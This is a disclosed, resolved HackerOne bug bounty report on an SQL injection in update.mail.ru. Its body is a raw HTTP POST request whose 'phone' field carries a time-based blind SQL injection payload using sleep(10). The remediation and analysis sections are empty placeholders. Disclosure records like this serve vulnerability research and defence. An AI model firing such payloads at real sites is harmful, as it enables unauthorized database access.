---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '11861'
original_report_id: '11861'
title: SQL injection update.mail.ru
weakness: SQL Injection
team_handle: mailru
created_at: '2014-05-12T18:30:36.120Z'
disclosed_at: '2014-05-30T11:39:42.303Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- sql-injection
---

# SQL injection update.mail.ru

## Metadata

- HackerOne Report ID: 11861
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-05-30T11:39:42.303Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

POST /interview/?interview HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Host: update.mail.ru
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*
Content-Length: 92

email=e&media=e&phone=/*'XOR(if(2=2,sleep(10),0))OR'&position=e&speaker=&username=e

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
